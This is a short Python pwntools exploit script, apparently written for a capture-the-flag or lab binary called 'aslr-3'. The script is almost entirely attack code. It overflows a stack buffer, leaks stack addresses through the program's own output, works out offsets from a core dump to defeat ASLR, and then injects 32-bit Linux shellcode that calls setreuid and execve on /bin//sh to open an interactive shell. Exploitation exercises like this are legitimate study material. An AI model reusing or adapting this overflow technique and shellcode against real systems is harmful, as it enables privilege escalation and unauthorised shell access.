#!/usr/bin/env python
from pwn import *

#SHELLCODE = 'SET YOUR SHELLCODE HERE'
SHELLCODE = 'j2X\xcd\x80\x89\xc3\x89\xc1jGX\xcd\x801\xc91\xd2j\x0bXQhn/shh//bi\x89\xe3\xcd\x80'

p = process("./aslr-3")

p.sendline("A"*0x90)
print(p.recvuntil('print?\n'))
p.sendline('256')

data = p.recv(0x200)
raw_data = data[144:-8]
addrs = [u32(raw_data[i:i+4]) for i in xrange(0, len(raw_data), 4)]
print(addrs)

p.wait()
c = Core('core')
buffer_addr = c.stack.find('A'*0x90)
print(buffer_addr)
offsets = [addr - buffer_addr for addr in addrs]
print(offsets)

p = process("./aslr-3")
e = ELF('./aslr-3')
get_input_fun = e.symbols['input_func']
print(get_input_fun)

p.sendline("A"*(0x88+4)+p32(get_input_fun))
print(p.recvuntil('print?\n'))
p.sendline('256')
data = p.recv(0x200)
raw_data = data[144:-8]
addrs = [u32(raw_data[i:i+4]) for i in xrange(0, len(raw_data), 4)]
print p32(addrs[1])
print p32(offsets[1])
leak = addrs[1]-offsets[1]

buffer = SHELLCODE + "A"*(0x88+4 - len(SHELLCODE)) + p32(leak)
p.sendline(buffer)
p.sendline('30')

p.interactive()